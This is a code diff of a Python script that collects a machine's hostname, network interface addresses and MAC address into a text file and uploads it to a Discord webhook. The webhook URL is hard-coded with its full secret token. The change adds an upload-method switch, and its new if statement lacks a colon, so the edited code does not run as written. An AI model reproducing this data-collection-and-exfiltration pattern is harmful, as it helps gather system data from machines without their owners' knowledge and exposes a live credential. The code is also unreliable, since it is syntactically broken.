@@ -12,15 +12,22 @@ import socket,psutil,os
 import netifaces as ni
 from getmac import get_mac_address as gma
 from discord_webhook import DiscordWebhook
-#define data
+
+#upload settings
+
+Upload_method = 'discord'
 
 hook = 'https://discordapp.com/api/webhooks/745098847881265303/QJRM5MbF7fHAuidNelyK4HsJUveTDhusqqt8OjvKMyFxjw17kJoq7x9VLzvSBHdGNzLz'
+
+#define data
 
 hostname = socket.gethostname()
 
 addrs = psutil.net_if_addrs()
 
 rawnics = (ni.interfaces())
+
+#open and name logfile
 
 f = open(hostname+'.txt', 'w+')
 
@@ -48,10 +55,11 @@ for i in rawnics:
 f.close()
 
 #Uploads to discord 
+if Upload_method == 'discord'
+    webhook = DiscordWebhook(url=hook, content='Data collected from '+hostname+'.')
+    with open(hostname+'.txt', "rb") as f:
+        webhook.add_file(file=f.read(), filename=hostname+'.txt')
+    response = webhook.execute()
+    
 
-webhook = DiscordWebhook(url=hook, content='Data collected from '+hostname+'.')
-
-with open(hostname+'.txt', "rb") as f:
-    webhook.add_file(file=f.read(), filename=hostname+'.txt')
-
-response = webhook.execute()
+    
